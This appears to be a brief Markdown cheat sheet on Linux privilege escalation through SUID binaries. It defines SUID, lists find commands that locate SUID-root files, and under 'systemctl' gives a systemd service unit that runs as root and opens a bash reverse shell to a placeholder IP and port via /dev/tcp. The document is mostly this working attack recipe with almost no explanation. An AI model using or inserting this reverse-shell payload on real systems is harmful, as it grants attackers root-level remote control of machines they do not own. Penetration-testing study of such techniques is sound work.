# Using files with SUID permission set

## What is SUID?

Set owner User ID, also known as Set user ID or setuid is a special flag in linux permission set.

## Find files with SUID set

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

```
find / -perm -u=s -type f 2>/dev/null
```

## systemctl

#### Reverse shell to root user

```
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<IP ADDRESS>/<PORT> 0>&1"
```



